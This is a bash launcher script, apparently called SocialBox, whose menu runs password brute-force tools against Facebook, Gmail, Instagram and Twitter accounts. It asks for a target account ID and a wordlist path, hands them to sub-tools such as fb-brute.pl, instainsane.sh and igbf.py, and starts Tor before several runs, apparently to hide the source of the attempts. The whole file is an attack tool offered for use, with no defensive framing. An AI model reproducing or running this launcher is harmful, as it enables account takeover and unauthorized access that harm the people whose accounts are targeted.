#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"

       echo -e "$red by samsesh.$nc"

#Installation
sleep 1
echo -e "Checking Installation $nc"
bash install-sb.sh >> /dev/null
echo -e "Checking Completed [$green✓$nc] $nc "
sleep 1
clear
#Startup
echo -e "$green"
echo "		.▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
echo "		▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
echo "		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
echo "		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
echo -e "		 ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v2.beta$nc"
#echo -e "	[+]              $red Coded By sam.sesh$nc         		   [+]"
#echo -e "	[+] 		 $red samsesh.net $nc 		   [+]"
#echo -e "	[+] 		 $red Greetz To All Pentesters$nc          		   [+]"
#echo -e "	[+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles, samsesh}$nc [+]"
echo ""
echo -e "$yellow Select From Menu : $nc"
echo ""
echo -e "		$Cyan 1 : Brute Force Facebook Account$nc"
echo -e "		$Cyan 2 : Brute Force Gmail Account$nc"
echo -e "		$Cyan 3 : Brute Force Instagram Account 1$nc"
echo -e "		$Cyan 4 : Brute Force Twitter Account$nc"
echo -e "		$Cyan 5 : Brute Force Instagram Account 2 $nc"
echo -e "		$Cyan 6 : Brute Force Facebook Account 2 (Python 3)$nc"
echo -e "		$Cyan 7 : Brute Force Instagram Account 3 (igbf - modern)$nc"
echo -e "		$Cyan 8 : Modern All-in-One (sosec - Instagram/Facebook/Gmail/Twitter)$nc"
echo -e "		$Cyan 99: Exit$nc"
read -p "Choice >  " ch
if [ $ch = 1 ]; then
echo -e "			$Cyan Facebook Brute Force$nc"
echo -e "$green"
read -p "Enter Facebook ID / Email / Username / Number: " id
read -p "Enter wordlist path : " wordlist
echo -e "$nc"
cd facebook
perl fb-brute.pl $id $wordlist
echo -e " 		[+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check
echo -e "$nc"
if [ $check = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 2 ]; then
echo -e "			$Cyan Gmail Brute Force$nc"
cd Gemail-Hack
python3 gemailhack.py
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check2
echo -e "$nc"
if [ $check2 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 3 ]; then
echo -e "			$Cyan Instagram Brute Force 1$nc"
cd instainsane/
sleep 0.025
	echo -e "	[+]$red tor $nc[+]"
sleep 0.9
sv tor start
./instainsane.sh
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
#echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check3
echo -e "$nc"
if [ $check3 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 4 ]; then
echo -e "			$Cyan Twitter Brute Force$nc"
cd tweetshell/
sleep 0.025
        echo -e "	[+]$red Service Tor Stated $nc[+]"
sleep 0.9
sv tor start
bash tweetshell.sh
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check4
echo -e "$nc"
if [ $check4 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 5 ]; then
echo -e "			$Cyan Instagram Brute Force 2$nc"
cd insta-bf/
sleep 0.025
        echo -e "	[+]$red Service Tor Started $nc[+]"
sleep 0.9
sv tor start
python3 instabf.py
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check5
echo -e "$nc"
if [ $check5 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 6 ]; then
echo -e "			$Cyan Facebook Brute Force 2 (Python 3)$nc"
echo -e "$green"
read -p "Enter Facebook ID / Email / Username: " id
read -p "Enter wordlist path : " wordlist
echo -e "$nc"
cd facebook-bf
cp "$wordlist" passwords.txt
echo "$id" | python3 fb.py 2>/dev/null
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check6
echo -e "$nc"
if [ $check6 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check6 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check6 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check6 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check6 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 7 ]; then
echo -e "			$Cyan Instagram Brute Force 3 (igbf)$nc"
cd igbf/
sleep 0.025
echo -e "	[+]$red Service Tor Started $nc[+]"
sleep 0.9
sv tor start
echo -e "$green"
read -p "Enter Instagram username: " user
read -p "Enter wordlist path: " wordlist
echo -e "$nc"
python3 igbf.py -u "$user" -w "$wordlist" -v
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check7
echo -e "$nc"
if [ $check7 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check7 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check7 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check7 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check7 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 8 ]; then
echo -e "			$Cyan Modern All-in-One (sosec)$nc"
cd sosec/
sleep 0.025
echo -e "	[+]$red Starting Modern Toolkit$nc"
python3 sosec.py
echo -e "               [+]$yellow Toolkit Complete $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check8
echo -e "$nc"
if [ $check8 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check8 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check8 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check8 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check8 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch == 99 ]; then
echo -e "$red Program Exit ...$nc"
sleep 0.25
exit 1
else
echo "Not Found 404 , Exit"
exit 1
fi
